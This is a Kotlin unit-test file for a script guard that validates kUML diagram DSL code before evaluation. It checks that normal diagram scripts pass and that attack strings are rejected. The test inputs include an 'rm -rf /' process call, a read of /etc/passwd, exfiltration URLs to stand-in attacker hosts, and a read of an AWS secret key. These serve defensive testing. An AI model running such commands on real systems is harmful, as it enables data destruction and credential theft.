package dev.kuml.core.script

import io.kotest.assertions.throwables.shouldNotThrowAny
import io.kotest.assertions.throwables.shouldThrow
import io.kotest.core.spec.style.FunSpec
import io.kotest.matchers.string.shouldContain

/**
 * Unit tests for [KumlScriptGuard].
 *
 * Verifies that well-formed kUML DSL scripts pass validation and that
 * representative ACE attack vectors are rejected before eval.
 *
 * V3.1.23
 */
class KumlScriptGuardTest :
    FunSpec({

        // ── Legitimate DSL scripts must pass ─────────────────────────────────

        test("minimal diagram script is accepted") {
            shouldNotThrowAny {
                KumlScriptGuard.validate("""diagram(name = "Hello") {}""")
            }
        }

        test("class diagram with stereotypes and packages is accepted") {
            val dsl =
                """
                diagram(name = "Bank") {
                    val account = classOf("Account") {
                        stereotypes += "entity"
                        attribute("balance", "BigDecimal")
                        operation("deposit", "Unit") { param("amount", "BigDecimal") }
                    }
                }
                """.trimIndent()
            shouldNotThrowAny { KumlScriptGuard.validate(dsl) }
        }

        test("C4 model script is accepted") {
            val dsl =
                """
                val model = c4Model("Internet Banking") {
                    val customer = person("Customer")
                    val bank = softwareSystem("Internet Banking System")
                    relationship(customer, bank, "Uses")
                }
                systemContextDiagram(model, "Context") {}
                """.trimIndent()
            shouldNotThrowAny { KumlScriptGuard.validate(dsl) }
        }

        test("blueprint DSL script is accepted") {
            val dsl =
                """
                val model = blueprint("Coffee Shop") {
                    phase("Order", order = 0) {}
                }
                journeyDiagram(model, "Journey") {}
                """.trimIndent()
            shouldNotThrowAny { KumlScriptGuard.validate(dsl) }
        }

        // ── Attack vectors must be rejected ───────────────────────────────────

        test("java.io reference is rejected") {
            val attack = """java.io.File("/etc/passwd").readText()"""
            val ex = shouldThrow<ScriptSecurityException> { KumlScriptGuard.validate(attack) }
            ex.message shouldContain "java.io"
        }

        test("File constructor call is rejected") {
            val attack = """val f = File("/tmp/pwned.txt"); f.writeText("hacked")"""
            shouldThrow<ScriptSecurityException> { KumlScriptGuard.validate(attack) }
        }

        test("ProcessBuilder is rejected") {
            val attack = """ProcessBuilder("rm", "-rf", "/").start()"""
            val ex = shouldThrow<ScriptSecurityException> { KumlScriptGuard.validate(attack) }
            ex.message shouldContain "ProcessBuilder"
        }

        test("Runtime.getRuntime() is rejected") {
            val attack = """Runtime.getRuntime().exec("id")"""
            shouldThrow<ScriptSecurityException> { KumlScriptGuard.validate(attack) }
        }

        test("java.net URL is rejected") {
            val attack = """java.net.URL("http://evil.example.com/exfil").readText()"""
            shouldThrow<ScriptSecurityException> { KumlScriptGuard.validate(attack) }
        }

        test("URL constructor call is rejected") {
            val attack = """val u = URL("http://attacker.example/steal"); u.openStream()"""
            shouldThrow<ScriptSecurityException> { KumlScriptGuard.validate(attack) }
        }

        test("Class.forName reflection is rejected") {
            val attack = """Class.forName("java.lang.Runtime").getMethod("exec", String::class.java)"""
            shouldThrow<ScriptSecurityException> { KumlScriptGuard.validate(attack) }
        }

        test("setAccessible reflection is rejected") {
            val attack = """val m = String::class.java.getDeclaredMethod("x"); m.isAccessible = true"""
            shouldThrow<ScriptSecurityException> { KumlScriptGuard.validate(attack) }
        }

        test("System.exit is rejected") {
            val attack = """System.exit(0)"""
            shouldThrow<ScriptSecurityException> { KumlScriptGuard.validate(attack) }
        }

        test("System.getenv is rejected") {
            val attack = """System.getenv("AWS_SECRET_ACCESS_KEY")"""
            shouldThrow<ScriptSecurityException> { KumlScriptGuard.validate(attack) }
        }

        test("kotlin.io reference is rejected") {
            val attack = """kotlin.io.path.writeText(java.nio.file.Path.of("/tmp/x"), "y")"""
            shouldThrow<ScriptSecurityException> { KumlScriptGuard.validate(attack) }
        }

        test("java.nio reference is rejected") {
            val attack = """java.nio.file.Files.write(java.nio.file.Paths.get("/tmp/x"), "y".toByteArray())"""
            shouldThrow<ScriptSecurityException> { KumlScriptGuard.validate(attack) }
        }
    })
